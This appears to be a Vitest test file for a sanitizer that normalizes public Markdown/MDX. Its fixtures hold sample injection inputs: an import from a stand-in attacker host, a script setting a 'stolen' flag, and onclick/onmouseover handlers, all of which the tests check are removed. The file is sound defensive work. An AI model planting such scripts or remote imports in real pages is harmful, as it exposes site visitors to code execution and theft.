import { describe, expect, it } from 'vitest';
import { normalizePublicMarkdownContent, portablePublicMdxMarkdown } from './public-markdown-content';

describe('public Markdown content normalization', () => {
  it.each(['$&', '$$', "$'", '$`'])('preserves replacement metacharacters in literal public code: %s', (token) => {
    const source = [`Example: \`\`literal ${token}\`\``, '', '~~~mdx', `literal ${token}`, '~~~'].join('\n');
    expect(normalizePublicMarkdownContent(source)).toBe(source);
  });

  it('projects supported MDX while removing executable imports and raw active HTML', () => {
    const source = `import Exploit from "https://attacker.example/exploit.js"

<Callout type="tip">**Portable guidance**</Callout>

<script>globalThis.stolen = true</script>

<Unknown onclick="run()">Readable</Unknown>

\`\`\`mdx
import Example from './example'
<Callout>Code sample</Callout>
\`\`\``;

    const normalized = normalizePublicMarkdownContent(source);

    expect(normalized).toContain('&gt; **Portable guidance**');
    expect(normalized).toContain('&lt;Unknown onclick=&quot;run()&quot;&gt;Readable&lt;/Unknown&gt;');
    expect(normalized).toContain("```mdx\nimport Example from './example'\n<Callout>Code sample</Callout>\n```");
    expect(normalized).not.toContain('Exploit');
    expect(normalized).not.toContain('globalThis.stolen');
    expect(normalized).not.toContain('<script>');
  });

  it('preserves literal HTML and JSON in variable-length inline code spans', () => {
    const source = [
      'Use `<script>alert(1)</script>` with `{"mode":"safe"}` as literal examples.',
      'A double delimiter preserves ``literal `tick`, <tag>, and {value}`` exactly.',
      '<script>globalThis.stolen = true</script>',
    ].join('\n');

    const normalized = normalizePublicMarkdownContent(source);

    expect(normalized).toContain('`<script>alert(1)</script>`');
    expect(normalized).toContain('`{"mode":"safe"}`');
    expect(normalized).toContain('``literal `tick`, <tag>, and {value}``');
    expect(normalized).not.toContain('globalThis.stolen');
  });

  it('keeps tooltip text in parentheses after the inline content', () => {
    expect(portablePublicMdxMarkdown('An <Tooltip tip="Application programming interface">API</Tooltip> call.')).toBe(
      'An API (Application programming interface) call.',
    );
    // Projected like the other attributes: Markdown syntax is escaped, line breaks collapse.
    expect(portablePublicMdxMarkdown('<Tooltip tip="Uses *stars* and\n[links]">term</Tooltip>')).toBe('term (Uses \\*stars\\* and \\[links\\])');
    expect(portablePublicMdxMarkdown('A <Tooltip tip="">term</Tooltip> and a <Tooltip>word</Tooltip>.')).toBe('A term and a word.');
  });

  it('keeps underlined text, and subscript and superscript as plain inline HTML so their meaning survives', () => {
    expect(normalizePublicMarkdownContent('A <u>underlined</u> word, H<sub>2</sub>O and x<sup>2</sup>.')).toBe(
      'A underlined word, H<sub>2</sub>O and x<sup>2</sup>.',
    );
    expect(normalizePublicMarkdownContent('10<SUP>-3</SUP> and x<sub>i</sub>')).toBe('10<sup>-3</sup> and x<sub>i</sub>');
    // Attributes are dropped, and code examples stay literal.
    expect(normalizePublicMarkdownContent('<u class="x">styled</u>, x<sup onclick="alert(1)" class="y">2</sup> and `<u>code</u>`')).toBe(
      'styled, x<sup>2</sup> and `<u>code</u>`',
    );
  });

  it('lets no other markup through subscript or superscript', () => {
    // An unmatched tag keeps only its text.
    expect(normalizePublicMarkdownContent('x<sup>2 and H<sub>2')).toBe('x2 and H2');
    // Anything inside a pair is still escaped, and nested tags are flattened.
    expect(normalizePublicMarkdownContent('x<sup><b onmouseover="a()">2</b></sup>')).toBe(
      'x<sup>&lt;b onmouseover=&quot;a()&quot;&gt;2&lt;/b&gt;</sup>',
    );
    expect(normalizePublicMarkdownContent('a<sub>1<sup>2</sup></sub>')).toBe('a<sub>12</sub>');
    // Escaped text that spells a tag is not turned back into one.
    expect(normalizePublicMarkdownContent('&lt;sup&gt;2&lt;/sup&gt;')).toBe('&amp;lt;sup&amp;gt;2&amp;lt;/sup&amp;gt;');
  });
});
